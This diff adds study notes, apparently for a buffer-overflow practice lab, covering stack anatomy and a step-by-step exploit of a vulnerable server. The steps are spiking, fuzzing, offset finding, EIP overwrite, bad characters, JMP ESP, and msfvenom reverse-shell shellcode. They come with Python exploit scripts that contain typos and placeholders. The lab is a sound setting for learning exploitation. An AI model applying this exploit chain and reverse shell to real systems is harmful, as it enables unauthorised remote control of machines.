@@ -1,0 +1,245 @@
+Buffer Overflow Prep Room
+• Download Immunity Debugger and Mona addon onto local windows virtual machine.
+* Be sure to run Immunity Debugger as administrator.
+
+Buffer Overflow Attacks
+
+--------Let's Beginp--------
+What will you need?
+1.Windows Machine
+2.Kali Machine
+3.Immunity Debugger
+4.mona.py for immunity debugger
+
+Anatomy of Memory
+
+		Kernal  (Top)       (1111)
+		Stack   (Our entry point)
+		Heap
+		Data
+		Text    (Bottom)   (0000)
+
+ Anatomy of The Stack
+ 
+ 		ESP (Extended Stack Pointer)       (Top)
+ 		Buffer Space  
+ 		EBP (Extended Base Pointer)       (Bottom)
+ 		EIP (Extended Instruction Pointer) / Return Address
+ 
+• Buffer space fills up with characters going down to the EBP.
+• If proper sanitizations of the buffer space is occuring, you should reach the EBP but stop.
+• A buffer overflow attack overflows the buffer space you are using and reach over the EBP and into the EIP.
+• EIP is the pointer or return address. We can use this address to point to directions that we instruct, directions are going to be malicious code that will give us a reverse shell.
+• If you can write over the buffer space, and over the EBP, and all the way down to the EIP, you can control the stack and control the pointer, and eventually can get a reverse shell.
+	
+	Steps to conduct a Buffer Overflow
+1. Spiking
+2. Fuzzing
+3. Finding the Offset 
+4. Overwriting the EIP
+5. Finding Bad Characters
+6. Finding the Right Module
+7. Generating Shellcode
+8. Root!
+
+Spiking---------------------------------------------------
+• In other words: Trying to break the program (Testing for vulnerabilities)
+ #nc -nc 0.0.0.0:port  (connect to vulnerable windows machine)
+• See the options available to us on the server
+• Next up is testing certain variables for vulnerabilities
+• Craft spike script to test option 
+nano option.spk(for spike) 
+	s_readline();
+	s_string("option");
+	s_string_variables("0");
+*Change option to whatver you are spiking
+ #generic_send_tcp 0.0.0.0 port option.spk 0 0
+
+Fuzzing----------------------------------------------------
+• Fuzzing Script:
+#!/usr/bin/python3
+
+import sys, socket
+from time import sleep
+
+buffer = “A” * 100
+
+while True:
+		   try:
+						s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+						s.connect(('0.0.0.0',0000))
+						
+						payload = “option /.:/” + buffer
+						
+						s.send((payload.encode()))
+						s.close()
+						sleep(1)
+						buffer = buffer + “A”*100
+						
+		   except:
+						print (Fuzzing crashed at %s bytes” % str(len(buffer)))
+						sys.exit()
+						
+#chmod +x fuzzscript.py
+#./fuzzscript.py 
+
+• We need to control the EIP!!!
+
+ Finding The Offset-------------------------------------------------
+• Setting up our new script:
+#usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <size> (generates text to input into our script)
+New Script:
+#!/usr/bin/python3
+import sys, socket
+from time import sleep
+
+offset = “text ”
+
+
+		   try:
+						s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+						s.connect(('0.0.0.0',0000))
+						
+						payload = “option /.:/” + offset
+						
+						s.send((payload.encode()))
+						s.close()
+						
+		   except:
+						print ("Error connecting to server")
+						sys.exit()
+#usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <size> -q <EIP characters>
+*offset pattern found: 0000
+
+Overwriting the EIP--------------------------------------------------------
+New Script:
+#!/usr/bin/python3
+
+import sys, socket
+from time import sleep
+
+shellcode = “A” * 2003 + “B” * 4
+
+
+		   try:
+						s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+						s.connect(('0.0.0.0',0000))
+						
+						payload = “option /.:/” + offset
+						
+						s.send((payload.encode()))
+						s.close()
+						
+		   except:
+						print ("Error connecting to server")
+						sys.exit()
+
+Finding Bad Characters----------------------------------------------------------
+• google badchars
+• copy badchars
+• paste badchars into script
+
+#!/usr/bin/python3
+
+import sys, socket
+from time import sleep
+
+badchars = ("badchars")
+
+shellcode = “A” * 2003 + “B” * 4 + badchars
+
+
+		   try:
+						s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+						s.connect(('0.0.0.0',0000))
+						
+						payload = “option /.:/” + shellcode
+						
+						s.send((payload.encode()))
+						s.close()
+						
+		   except:
+						print ("Error connecting to server")
+						sys.exit()
+
+• Save script
+#./script.py
+• Now look at hexdump after saying follow ESP
+• Look for the bad characters in the hex dump( missing numbers replaced with something odd.)
+• note down all missing characters
+• UPDATE####
+•  for manually reviewing. Instead just use mona!!!
+Type in immunity: !mona compare -f c:\mona|bytearray.bin -a 010AF9C8(ESP value) then hit enter
+• It will then show all the possible bad characters! much easier than manually checking.
+
+Finding The Right Module
+• Download mona.py for immunity debugger
+• In immunity debugger type in at the bottom: mona modules 
+• Looking for something attached to vulnserver with all falses
+#locate nsm_shell
+#/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+nasm > JMP ESP
+• back to immunity and type in: !mona find -s "\xff\xe4 -m essfunc.dll      (op code equilvalent and essfunc.dll from mona)
+• Now we are looking for return address. 
+Now go back to kali and edit our script again
+
+
+#!/usr/bin/python3
+
+import sys, socket
+from time import sleep 
+
+shellcode = “A” * 0000(where the EIP starts) + “\xaf\x11\x50\x62”  (from our jmpcode: 625011af)
+
+		   try:
+						s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+						s.connect(('0.0.0.0',0000))
+						
+						payload = “option /.:/” + shellcode
+						
+						s.send((payload.encode()))
+						s.close()
+						
+		   except:
+						print ("Error connecting to server")
+						sys.exit()
+						
+• Save script and go back to immunity 
+• click on bluish black arrow and enter jmpcode from the above script
+• hit f2 to turn it blue to set breakpoint
+#./script.py
+• UPDATE######
+Type into immunity: !mona jmp -r ESP -m “essfunc.dll”
+
+Generating Shellcode to gain root
+Using msfvenom to generate shellcode
+#msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -f c -a x86 -b “\x00” (If we had any bad characters from before then this end part is where we would put them in)
+• Copy shellcode
+• Paste into our python script that we have been using.
+• put a b in front of all our line to indicate byte encoding
+
+#!/usr/bin/python3
+
+import sys, socket
+from time import sleep
+
+overflow = (paste_in_generated overflow)  (p
+
+shellcode = b“A” * 0000(where the EIP starts) + b“\xaf\x11\x50\x62”  + b“\x90” * 32 + overflow  (added padding to make it safer)
+
+		   try:
+						s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+						s.connect(('0.0.0.0',0000))
+						
+						payload = b“option /.:/” + shellcode
+						
+						s.send((payload))
+						s.close()
+						
+		   except:
+						print ("Error connecting to server")
+						sys.exit()
+			
+• Save script and start a nc listener
+• run script
+#./script.py
